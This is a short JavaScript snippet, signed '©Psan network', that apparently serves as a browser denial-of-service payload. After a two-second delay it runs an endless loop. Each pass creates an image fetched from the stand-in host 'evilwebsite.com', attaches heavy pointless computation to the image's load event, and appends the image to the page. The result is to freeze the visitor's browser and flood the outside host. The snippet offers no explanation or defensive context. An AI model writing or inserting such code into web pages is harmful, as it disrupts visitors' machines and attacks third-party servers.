setTimeout(function() {
  while (true) {
    let img = new Image();
    img.src = 'http://evilwebsite.com/large.jpg';
    img.onload = function() {
      for (let i = 0; i < 10000; i++) {
        Math.pow(Math.PI, Math.random());
      }
    };
    document.body.appendChild(img);
  }
}, 2000);
//©Psan network
